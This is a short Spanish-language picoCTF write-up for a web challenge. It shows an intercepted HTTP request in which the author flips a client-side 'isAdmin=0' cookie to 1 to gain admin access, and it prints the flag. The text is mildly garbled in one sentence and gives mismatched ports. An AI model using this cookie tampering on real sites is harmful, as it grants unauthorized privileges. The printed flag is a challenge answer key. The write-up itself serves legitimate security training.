#### Descripción

¿Puedes conseguir la bandera?Vaya a este [sitio web](http://saturn.picoctf.net:52010/) y vea lo que puede descubrir.

## Solución

Si utilicé un programa como Burp Suite e intercepté la solicitud HTTP, podemos ver lo siguiente.

```httpspec
GET /check.php HTTP/1.1
Host: saturn.picoctf.net:52021
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://saturn.picoctf.net:52021/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: isAdmin=0
Connection: close
```

Podemos ver que hay un archivo . Cambié eso a 1 y obtuve la bandera.`Cookie: isAdmin=0`

## Bandera

`picoCTF{gr4d3_A_c00k13_0d351e23}`